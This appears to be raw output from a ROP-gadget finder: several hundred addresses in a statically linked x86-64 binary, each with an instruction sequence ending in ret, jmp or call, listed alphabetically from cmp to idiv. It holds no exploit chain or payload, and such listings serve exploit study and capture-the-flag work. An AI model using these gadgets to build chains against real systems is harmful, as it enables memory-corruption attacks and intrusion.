0x0000000000478849 : cmp rcx, rsi ; jne 0x478848 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00000000004852d5 : cmp rcx, rsi ; jne 0x4852b6 ; ret
0x000000000047c54d : cmp rdi, rdx ; ja 0x47c57e ; ret
0x000000000044d9b1 : cmp rdi, rdx ; jb 0x44d9c0 ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000426119 : cmp rdx, r8 ; jne 0x4260e6 ; ret
0x000000000044e79a : cmp rdx, rcx ; jne 0x44e789 ; ret
0x000000000044e799 : cmp rdx, rcx ; jne 0x44e78a ; ret
0x000000000044e901 : cmp rdx, rcx ; jne 0x44e8ef ; vzeroupper ; ret
0x000000000044eac4 : cmp rdx, rcx ; jne 0x44eaaa ; vzeroupper ; ret
0x0000000000452829 : cmp rdx, rdi ; setae al ; ret
0x0000000000401859 : cmp rsi, 0 ; jne 0x401826 ; ret
0x000000000041e4c9 : cmp rsi, rcx ; jne 0x41e4c8 ; lea eax, dword ptr [rdx + rdi] ; ret
0x0000000000433d39 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x000000000049b2e8 : cmpsb byte ptr [rsi], byte ptr [rdi] ; mov bh, cl ; jmp qword ptr [rsi]
0x000000000049b2dc : cmpsb byte ptr [rsi], byte ptr [rdi] ; mov cl, bh ; jmp qword ptr [rsi + 0x26fff989]
0x000000000049b2e0 : cmpsb byte ptr [rsi], byte ptr [rdi] ; mov ecx, edi ; jmp qword ptr [rsi]
0x000000000049b2f0 : cmpsb byte ptr [rsi], byte ptr [rdi] ; mov edi, ecx ; jmp qword ptr [rsi]
0x0000000000444a26 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000049b54d : cmpsb byte ptr [rsi], byte ptr [rdi] ; stc ; lcall ptr [rax - 0x2e] ; stc ; jmp qword ptr [rax]
0x0000000000483628 : cmpsd dword ptr [rsi], dword ptr [rdi] ; add rax, rdi ; jmp rax
0x000000000049c249 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cli ; inc dword ptr [rax - 0x6c] ; cli ; call rax
0x0000000000491bc0 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x0000000000420b5c : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000491c55 : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x00000000004582ff : cwde ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x0000000000498c5c : cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00000000004983bc : cwde ; add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x00000000004b7558 : cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x0000000000401601 : cwde ; ret
0x00000000004b7859 : cwde ; stc ; jmp qword ptr [rcx]
0x0000000000448d11 : dec byte ptr [r8 + 0x29] ; ret 0x280f
0x0000000000448d12 : dec byte ptr [rax + 0x29] ; ret 0x280f
0x000000000044e2dd : dec byte ptr [rax + 0x7f] ; jl 0x44e302 ; cld ; vzeroupper ; ret
0x00000000004648d9 : dec byte ptr [rax - 0x75] ; mov ebp, 0xfffff758 ; call rax
0x000000000048795f : dec byte ptr [rax - 0x77] ; fisttp word ptr [rax - 0x77] ; ret 0x45e8
0x0000000000479330 : dec byte ptr [rax - 0x77] ; ret
0x00000000004878fd : dec byte ptr [rax - 0x7d] ; ret
0x0000000000409ac1 : dec byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xc031
0x0000000000451332 : dec byte ptr [rbx + rcx*4 + 0x5f] ; or byte ptr [rcx - 0xa], al ; ret
0x0000000000414d66 : dec byte ptr [rcx + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000414917 : dec byte ptr [rcx + rcx*4 - 0x11] ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000488659 : dec dword ptr [r8 - 0x7d] ; clc ; std ; jbe 0x488671 ; ret
0x000000000045d4f3 : dec dword ptr [r8 - 0x7d] ; ret 0x8801
0x00000000004ab053 : dec dword ptr [rax + 0x20fffcb1] ; mov al, 0xfc ; jmp qword ptr [rax]
0x0000000000417d2d : dec dword ptr [rax + 0x29] ; ret
0x0000000000448e52 : dec dword ptr [rax + 0x29] ; ret 0x280f
0x0000000000489621 : dec dword ptr [rax + 0x29] ; ret 0x8948
0x0000000000489761 : dec dword ptr [rax + 0x29] ; ret 0x894c
0x00000000004251a5 : dec dword ptr [rax + 0x29] ; ret 0x8d4c
0x000000000047cf6b : dec dword ptr [rax + 0x39] ; ret
0x0000000000419b5d : dec dword ptr [rax + 0x39] ; ret 0x860f
0x000000000048fe29 : dec dword ptr [rax + 0x39] ; ret 0xf48
0x000000000048b31e : dec dword ptr [rax + 0x48e57506] ; mov eax, esi ; ret
0x0000000000475a02 : dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x8502
0x000000000047a119 : dec dword ptr [rax + 0xf] ; mov ebp, 0xf80148c6 ; ret
0x0000000000486511 : dec dword ptr [rax + 0xf] ; ret 0x66c3
0x000000000042a231 : dec dword ptr [rax + 0xf] ; ret 0x8348
0x000000000047a8c9 : dec dword ptr [rax + 0xf] ; ret 0x90c3
0x0000000000461c2b : dec dword ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x148
0x0000000000479481 : dec dword ptr [rax + 1] ; ret
0x0000000000409983 : dec dword ptr [rax - 0x39] ; ret
0x000000000044ff7f : dec dword ptr [rax - 0x39] ; ret 0
0x0000000000464940 : dec dword ptr [rax - 0x39] ; ret 0x2c20
0x000000000044ff24 : dec dword ptr [rax - 0x39] ; ret 0x8000
0x000000000044fe97 : dec dword ptr [rax - 0x39] ; ret 0xff80
0x000000000046f5d6 : dec dword ptr [rax - 0x39] ; ret 0xffa0
0x0000000000450215 : dec dword ptr [rax - 0x39] ; ret 0xffc0
0x000000000044fdec : dec dword ptr [rax - 0x39] ; ret 0xffff
0x000000000049b38f : dec dword ptr [rax - 0x56] ; stc ; call qword ptr [rax]
0x000000000045d404 : dec dword ptr [rax - 0x73] ; add cl, byte ptr [rax + 0x39] ; ret
0x0000000000486735 : dec dword ptr [rax - 0x73] ; push rbp ; add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x00000000004255f8 : dec dword ptr [rax - 0x73] ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x870f
0x0000000000492e62 : dec dword ptr [rax - 0x75] ; add byte ptr [rcx + 1], cl ; ret 0xef89
0x0000000000455cac : dec dword ptr [rax - 0x75] ; jne 0x455c46 ; call rsi
0x000000000046fdeb : dec dword ptr [rax - 0x75] ; mov ebp, 0xfffff730 ; call rax
0x000000000049368f : dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004ab0bf : dec dword ptr [rax - 0x7700034f] ; mov cl, 0xfc ; jmp qword ptr [rax]
0x000000000048889c : dec dword ptr [rax - 0x77] ; adc byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00000000004262a4 : dec dword ptr [rax - 0x77] ; add eax, 0x29b5b4 ; ret
0x0000000000491017 : dec dword ptr [rax - 0x77] ; add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x00000000004860b1 : dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004083ed : dec dword ptr [rax - 0x77] ; ret
0x000000000047c53e : dec dword ptr [rax - 0x77] ; ret 0x1477
0x0000000000425a9f : dec dword ptr [rax - 0x77] ; ret 0x2948
0x00000000004838e7 : dec dword ptr [rax - 0x77] ; ret 0x50e8
0x000000000042ae4b : dec dword ptr [rax - 0x77] ; ret 0x5ae9
0x000000000047c49d : dec dword ptr [rax - 0x77] ; ret 0x7577
0x000000000042581c : dec dword ptr [rax - 0x77] ; ret 0x8548
0x000000000042a1a7 : dec dword ptr [rax - 0x77] ; ret 0x854d
0x0000000000461a52 : dec dword ptr [rax - 0x77] ; ret 0x870f
0x00000000004745e8 : dec dword ptr [rax - 0x77] ; ret 0x8b44
0x000000000044fd16 : dec dword ptr [rax - 0x77] ; ret 0x8b48
0x000000000047f2cc : dec dword ptr [rax - 0x77] ; ret 0x8d4c
0x000000000042a8c6 : dec dword ptr [rax - 0x77] ; ret 0x90e9
0x0000000000451045 : dec dword ptr [rax - 0x77] ; ret 0xa076
0x000000000044fe71 : dec dword ptr [rax - 0x77] ; ret 0xa0e9
0x000000000045d41d : dec dword ptr [rax - 0x77] ; ret 0xb2eb
0x000000000044fe5d : dec dword ptr [rax - 0x77] ; ret 0xb4e9
0x000000000042acd8 : dec dword ptr [rax - 0x77] ; ret 0xb60f
0x00000000004726f9 : dec dword ptr [rax - 0x77] ; ret 0xb848
0x0000000000474956 : dec dword ptr [rax - 0x77] ; ret 0xd1e8
0x000000000047ca7c : dec dword ptr [rax - 0x77] ; ret 0xefeb
0x000000000047699a : dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000040c19f : dec dword ptr [rax - 0x77] ; ret 0xf748
0x00000000004705e3 : dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000048865a : dec dword ptr [rax - 0x7d] ; clc ; std ; jbe 0x488670 ; ret
0x000000000040b0ef : dec dword ptr [rax - 0x7d] ; ret
0x000000000045b221 : dec dword ptr [rax - 0x7d] ; ret 0x4801
0x000000000045990b : dec dword ptr [rax - 0x7d] ; ret 0x4804
0x000000000040c6eb : dec dword ptr [rax - 0x7d] ; ret 0x4901
0x000000000045d4f4 : dec dword ptr [rax - 0x7d] ; ret 0x8801
0x0000000000494c57 : dec dword ptr [rax - 0x7d] ; ret 0xe902
0x000000000045fff8 : dec dword ptr [rax - 0x7d] ; rol byte ptr [rcx], 0x83 ; ret 0x4801
0x00000000004520d0 : dec dword ptr [rax - 0x7f] ; ret
0x000000000043b2cc : dec dword ptr [rax - 0x7f] ; ret 0x80
0x000000000047dc97 : dec dword ptr [rax - 9] ; fmul dword ptr [rcx + 0x21] ; ret 0x394c
0x0000000000495654 : dec dword ptr [rax - 9] ; ret
0x0000000000468844 : dec dword ptr [rbp + 0x63] ; ret 0x20be
0x000000000046ea6d : dec dword ptr [rbp - 0x77] ; ret 0x894c
0x0000000000463096 : dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x000000000042ab03 : dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x0000000000407764 : dec dword ptr [rbx + 0x2bc6d115] ; add bh, dh ; ret 0
0x000000000042981d : dec dword ptr [rbx + 0x90c2454] ; ret 0xbae9
0x0000000000478788 : dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x0000000000477d1b : dec dword ptr [rbx - 0x3b7cb7fa] ; or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000467083 : dec dword ptr [rcx + 0x39] ; ret
0x000000000046879f : dec dword ptr [rcx + 0x39] ; ret 0x850f
0x0000000000482f89 : dec dword ptr [rcx + 0x39] ; ret 0x860f
0x0000000000471f05 : dec dword ptr [rcx + 0x63] ; ret
0x0000000000471a87 : dec dword ptr [rcx + 0x63] ; ret 0x8545
0x0000000000408b1d : dec dword ptr [rcx + 0x63] ; test dword ptr [rax], r8d ; add rax, r13 ; jmp rax
0x0000000000483205 : dec dword ptr [rcx + rax - 0x28] ; call rax
0x000000000045edfa : dec dword ptr [rcx + rcx*4 - 0x11] ; call r12
0x0000000000455ca9 : dec dword ptr [rcx + rcx*4 - 1] ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x000000000045ef51 : dec dword ptr [rcx + rcx*4 - 9] ; call rbx
0x000000000045f22f : dec dword ptr [rcx + rcx*4 - 9] ; call rdx
0x0000000000464736 : dec dword ptr [rcx - 0x2f42763f] ; idiv bh ; call rax
0x0000000000490087 : dec dword ptr [rcx - 0x73] ; or byte ptr [rax - 0x77], r9b ; ret
0x0000000000414bdf : dec dword ptr [rcx - 0x75] ; add byte ptr [r8 - 0x7d], r9b ; ret
0x0000000000466fe7 : dec dword ptr [rcx - 0x77] ; ret
0x00000000004832d0 : dec dword ptr [rcx - 0x77] ; ret 0x13e9
0x000000000040b131 : dec dword ptr [rcx - 0x77] ; ret 0x149
0x0000000000483c70 : dec dword ptr [rcx - 0x77] ; ret 0x9be9
0x0000000000471a54 : dec dword ptr [rcx - 0x77] ; ret 0xff31
0x0000000000422cd6 : dec dword ptr [rcx - 0x7b] ; ret
0x0000000000466def : dec dword ptr [rcx - 0x7d] ; ret
0x00000000004672eb : dec dword ptr [rdi + rcx + 0x48] ; ret 0x958b
0x00000000004577ab : dec dword ptr [rdi] ; ret 0x41c3
0x0000000000459e0f : dec dword ptr [rdi] ; test byte ptr [rsi - 0x8fffffc], cl ; ret 0
0x000000000044cea0 : dec dword ptr [rdi] ; test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004665cf : dec dword ptr [rdi] ; test dword ptr [rsi - 0x16000007], esi ; ret
0x00000000004843ca : dec dword ptr [rdi] ; xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000427dac : dec dword ptr [rdi] ; xchg eax, ebp ; ret 0xd020
0x000000000041f2ab : dec dword ptr [rdi] ; xchg eax, ebp ; sal bh, 0xd8 ; ret
0x00000000004ab0d3 : dec eax ; mov al, 0xfc ; jmp qword ptr [rax]
0x0000000000401a3f : dec esi ; jne 0x401a38 ; xor r10, r10 ; ret
0x0000000000401a9f : dec esi ; jne 0x401a98 ; xor r10, r10 ; ret
0x00000000004ab03f : dec esp ; scasb al, byte ptr [rdi] ; cld ; lcall ptr [rdi + rbp*4] ; cld ; jmp qword ptr [rax]
0x0000000000448e51 : dec qword ptr [r8 + 0x29] ; ret 0x280f
0x0000000000401a3e : dec rsi ; jne 0x401a39 ; xor r10, r10 ; ret
0x0000000000401a9e : dec rsi ; jne 0x401a99 ; xor r10, r10 ; ret
0x000000000047a302 : div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x0000000000485335 : div byte ptr [rbx + rax + 0x48] ; mov dword ptr [rsi], edi ; mov rax, rcx ; ret
0x000000000045f371 : div byte ptr [rsp + rcx - 0x7d] ; inc byte ptr [rbx] ; je 0x45f389 ; ret
0x000000000046cab6 : div eax ; add r9d, eax ; mov eax, r9d ; ret
0x0000000000476a56 : div ebp ; mov rbp, rax ; jmp 0x476a25
0x000000000044ecd8 : div ecx ; mov eax, eax ; ret
0x000000000044ecbf : div ecx ; pop rbx ; mov eax, eax ; ret
0x0000000000476a55 : div r13 ; mov rbp, rax ; jmp 0x476a26
0x000000000046cab5 : div r8d ; add r9d, eax ; mov eax, r9d ; ret
0x0000000000432397 : enter -0x23b, -0x29 ; ret 0xc085
0x0000000000485290 : enter -0x3eb8, -8 ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x000000000044d014 : enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x000000000048a3ab : enter -0x72b8, 0x41 ; adc byte ptr [rdi], cl ; sahf ; ret 0x3948
0x0000000000448d0e : enter -0x72b8, 0x49 ; dec byte ptr [rax + 0x29] ; ret 0x280f
0x0000000000448e4e : enter -0x72b8, 0x49 ; dec dword ptr [rax + 0x29] ; ret 0x280f
0x0000000000432177 : enter -0x73b, 0x77 ; ret
0x000000000048539a : enter -0x76b8, -0x38 ; ret
0x0000000000432b44 : enter -2, -1 ; ret
0x0000000000475fec : enter 0x117f, 1 ; clc ; mov rdx, r8 ; jmp 0x475fc6
0x0000000000447299 : enter 0x148, -8 ; vzeroupper ; ret
0x0000000000472939 : enter 0x1b9, 0 ; add byte ptr [rax], al ; jmp rax
0x000000000048b171 : enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004475fe : enter 0x2948, -0x30 ; vzeroupper ; ret
0x000000000040755d : enter 0x2b, -0x77 ; ret 0x1d89
0x000000000042c6fd : enter 0x31c3, -0x40 ; ret
0x000000000044d600 : enter 0x357e, 0x48 ; movsxd rax, ecx ; ret
0x00000000004b081c : enter 0x8ac, 0x47 ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x0000000000433de6 : enter 0xf66, -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000446c61 : enter 0xf66, -0x15 ; ret
0x00000000004b33c4 : enter 9, 0 ; clc ; test ebp, esi ; call qword ptr [rdx]
0x0000000000493d73 : fadd dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x0000000000416618 : fadd dword ptr [rax] ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000401d9e : fadd dword ptr [rax] ; add byte ptr [rax], al ; ret
0x0000000000406f80 : fadd dword ptr [rcx + 0x21] ; ret
0x000000000046caa3 : fadd qword ptr [rcx + rcx*4 - 0x38] ; ret
0x0000000000406ef2 : fadd qword ptr [rcx - 0x77] ; ret
0x0000000000406ed6 : fadd st(1), st(0) ; ret 0x109
0x000000000040640f : fadd st(4), st(0) ; jnp 0x40640c ; jmp 0x406437
0x0000000000406722 : fadd st(4), st(0) ; jnp 0x40671f ; jmp 0x40674a
0x0000000000406a90 : fadd st(4), st(0) ; jnp 0x406a8d ; jmp 0x406ab8
0x0000000000433931 : fbld dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000496b84 : fbstp dword ptr [rbp - 0x17] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000407123 : fcmovb st(0), st(1) ; ret 0x410b
0x0000000000406cc1 : fcmovb st(0), st(1) ; ret 0x410c
0x00000000004afe58 : fcmovb st(0), st(3) ; ret
0x0000000000406d01 : fcmovnb st(0), st(1) ; ret
0x000000000044771b : fcmovnb st(0), st(5) ; std ; xlatb ; ret
0x00000000004657b6 : fcmovnb st(0), st(6) ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000493d79 : fcomi st(3) ; ret
0x000000000040153e : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; pop r13 ; ret
0x000000000041b186 : fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000450ee1 : fcomp dword ptr [rbx + 0x5d] ; ret
0x00000000004b0bd9 : fcomp dword ptr [rdx + 0x21] ; ret
0x00000000004aee40 : fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x00000000004b1aa0 : fcomp qword ptr [rdi - 0x600b0003] ; std ; jmp qword ptr [rbx]
0x000000000048f078 : fdiv dword ptr [rbp + 0x11] ; add rsp, 0x40 ; pop rbx ; ret
0x000000000048f15f : fdiv dword ptr [rbp + 0x12] ; add rsp, 0x50 ; pop rbx ; ret
0x000000000049c97c : fdiv dword ptr [rip + 0x3632fffb] ; sti ; jmp rdx
0x000000000049b669 : fdiv st(1), st(0) ; jmp qword ptr [rax]
0x000000000049b609 : fdiv st(1), st(0) ; jmp rax
0x0000000000401971 : fdiv st(3) ; ret
0x000000000049b9cc : fdiv st(3), st(0) ; stc ; ljmp ptr [rbx + rdi*8 - 7] ; call qword ptr [rdx]
0x000000000049bbd1 : fdivp st(1) ; call rax
0x000000000049b681 : fdivr st(1) ; call rax
0x000000000049b661 : fdivr st(1) ; jmp qword ptr [rax]
0x00000000004ae195 : fdivr st(4) ; test al, 0x97 ; xchg eax, esp ; ret
0x000000000044d018 : fdivr st(7) ; ret
0x00000000004005c1 : fiadd dword ptr [rax] ; test dl, dl ; jne 0x4005d0 ; ret
0x0000000000415978 : fiadd dword ptr [rbp + 0x450f48c9] ; ret 0x8348
0x00000000004b0a26 : ficomp word ptr [rdx - 0x19] ; cmc ; mov ch, 0xab ; ret
0x00000000004023e9 : fidiv word ptr [rcx] ; mov dword ptr [rcx - 0x3f], 0x894106cd ; ret 0x2141
0x000000000048ecd5 : fidivr dword ptr [rax + 1] ; ret
0x0000000000406cc7 : fild dword ptr [rcx] ; ret 0x3141
0x000000000040730c : fild dword ptr [rcx] ; ret 0x8d42
0x000000000042b161 : fild word ptr [r9] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000046b892 : fild word ptr [rbp - 0x77] ; ret 0x8b4c
0x000000000042b162 : fild word ptr [rcx] ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004b2c56 : fild word ptr [rcx] ; ret
0x000000000042074c : fimul dword ptr [rax + 0x21] ; ret 0x8948
0x000000000045bfb9 : fimul dword ptr [rax + 0x29] ; ret 0x8348
0x0000000000487957 : fimul dword ptr [rax + 0x39] ; ret 0x7472
0x000000000046c42d : fimul dword ptr [rax + 0x39] ; ret 0xe57f
0x0000000000401899 : fimul dword ptr [rax + 0xf] ; ret 0xc3f3
0x0000000000430ec6 : fimul dword ptr [rax + rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000472dad : fimul dword ptr [rax - 0x3f] ; clc ; add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x000000000045794f : fimul word ptr [rax + 1] ; ret
0x000000000048afbe : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x48b018
0x000000000048edde : fimul word ptr [rbp + rcx*4 + 0xa] ; jmp 0x48ee38
0x0000000000428501 : fimul word ptr [rcx + rcx*4 - 0x11] ; call 0x424746
0x0000000000416c3d : fistp qword ptr [rdi - 0x76b7ffd6] ; ret 0x8948
0x000000000041d18e : fistp word ptr [rbx + 0x5d] ; jmp rax
0x00000000004779f0 : fistp word ptr [rbx + 0x5d] ; pop r12 ; jmp rax
0x000000000040191f : fisttp dword ptr [rax - 0x73] ; and al, 8 ; ret
0x000000000045f587 : fisttp dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000489fb1 : fisttp dword ptr [rax - 0x77] ; ret
0x000000000046d27c : fisttp dword ptr [rax - 0x7b] ; rol byte ptr [rcx + 0xf], 0x94 ; ret
0x0000000000486126 : fisttp dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret
0x000000000047eb9e : fisttp dword ptr [rax - 0x7d] ; ret
0x00000000004931a0 : fisttp dword ptr [rbx + 0x63] ; add al, 0x99 ; add rax, r9 ; jmp rax
0x0000000000489fcb : fisttp dword ptr [rcx - 0x77] ; ret 0x8b4a
0x000000000045bc97 : fisttp dword ptr [rcx - 0x7d] ; ret
0x0000000000484244 : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x000000000042799b : fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0xd020
0x000000000040c70e : fisttp qword ptr [rax - 0x7d] ; ret 0x4401
0x000000000045e8ea : fisttp qword ptr [rdi] ; ret 0xc389
0x0000000000487962 : fisttp word ptr [rax - 0x77] ; ret 0x45e8
0x0000000000408253 : fisttp word ptr [rax - 0x7d] ; ret
0x000000000048a04f : fisttp word ptr [rax] ; add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x0000000000445d5d : fisttp word ptr [rip - 0x7cb80000] ; ret 0x4910
0x0000000000433d01 : fisub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000433a01 : fisub word ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000481cf3 : fisubr word ptr [rbx + 0xf480002] ; ret 0x3e80
0x000000000048a2c4 : fld qword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x000000000046cdc8 : fld qword ptr [rbx] ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x4ce8
0x00000000004aee81 : fld qword ptr [rsi + 0x32] ; mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x000000000047a1b2 : fld st(5) ; std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x0000000000426249 : fld xword ptr [rcx] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000431da9 : fldenv dword ptr [rsi + 0xf] ; je 0x431e06 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x0000000000432087 : fldenv dword ptr [rsi + 0xf] ; je 0x4320e4 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x0000000000433d81 : fldenv dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000431ca1 : fldenv dword ptr [rsi + 0xf] ; xlatb ; ret
0x000000000046f29c : fldpi ; stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x000000000048b064 : fmul dword ptr [rax + 0x11] ; rcr byte ptr [rbp + 0x5b], 1 ; ret
0x000000000042184f : fmul dword ptr [rax + 0x39] ; ret
0x0000000000418c28 : fmul dword ptr [rax - 0x77] ; ret
0x00000000004149f1 : fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x00000000004905d4 : fmul dword ptr [rbx + rcx*4 + 0x34] ; ret 0xf41
0x000000000047dc9a : fmul dword ptr [rcx + 0x21] ; ret 0x394c
0x000000000046fc80 : fmul dword ptr [rdi] ; ret
0x0000000000401e15 : fmul dword ptr [rdi] ; ret 0xc35b
0x000000000048d862 : fmul qword ptr [rax - 0x77] ; ret
0x000000000042b4b9 : fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043f9df : fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00000000004b33d8 : fmul qword ptr [rcx] ; add byte ptr [rax], al ; add al, 0x86 ; cmc ; call rsp
0x00000000004663af : fmul qword ptr [rdi] ; lea ebp, dword ptr [rdx] ; add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x000000000045eae8 : fmul qword ptr [rdi] ; ret 0xc389
0x000000000042b01f : fnsave dword ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000045d14d : fnsave dword ptr [rdx + 0x68] ; mov rdx, rax ; jmp 0x45d114
0x0000000000414469 : fpatan ; ret
0x0000000000433b01 : frstor dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004aeb67 : fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x00000000004aeee0 : fstp st(0) ; ret 0xde5d
0x0000000000450008 : fsub dword ptr [rcx + rcx*4 + 1] ; or rax, 0xffffffffffffffff ; ret
0x0000000000450098 : fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; ret
0x0000000000433e01 : fsub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000447b84 : fsub dword ptr [rsi + 0xf] ; xlatb ; ret
0x000000000044d42b : fsub qword ptr [rsi + 0xf] ; jmp 0x44d3f7
0x0000000000433c01 : fsub qword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000446d7c : fsub qword ptr [rsi + 0xf] ; xlatb ; ret
0x00000000004b2c48 : fsubr st(1) ; hlt ; jmp rdi
0x0000000000450644 : fsubr st(3) ; ret 0xf66
0x00000000004b0bb8 : fucom st(5) ; loop 0x4b0c11 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000480dd1 : fucomi st(3) ; ret 0x1f0f
0x0000000000405c33 : fucomp st(7) ; in eax, 0xc4 ; ret
0x0000000000478c57 : fucompi st(0) ; ret
0x0000000000492071 : fucompi st(1) ; ret
0x000000000049b685 : fyl2xp1 ; call rax
0x000000000049b5e1 : fyl2xp1 ; jmp qword ptr [rax]
0x000000000049b601 : fyl2xp1 ; jmp rax
0x000000000049ba94 : hlt ; add bh, dl ; push qword ptr [rdx + rax - 6] ; jmp rsp
0x0000000000451701 : hlt ; call r15
0x00000000004b703c : hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x0000000000467528 : hlt ; jb 0x467558 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004aef68 : hlt ; jmp 0x4aef3d
0x00000000004b810a : hlt ; jmp qword ptr [rbx]
0x00000000004bb432 : hlt ; jmp qword ptr [rcx]
0x00000000004b2c4a : hlt ; jmp rdi
0x0000000000485c78 : hlt ; jrcxz 0x485ca6 ; add byte ptr [rcx - 0x75], al ; adc edi, dword ptr [rcx] ; ret 0x840f
0x00000000004b1aa4 : hlt ; lahf ; std ; jmp qword ptr [rbx]
0x000000000043b70a : hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004363be : hlt ; mov dword ptr [rdi - 4], edx ; ret
0x000000000044cb23 : hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x0000000000400a9a : hlt ; nop dword ptr [rax + rax] ; ret
0x000000000040182a : hlt ; ret
0x000000000049bbcd : hlt ; stc ; call qword ptr [rax - 0x2f000622]
0x00000000004af0a3 : hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x000000000044cb27 : hlt ; sub eax, edx ; ret
0x000000000046473c : idiv bh ; call rax
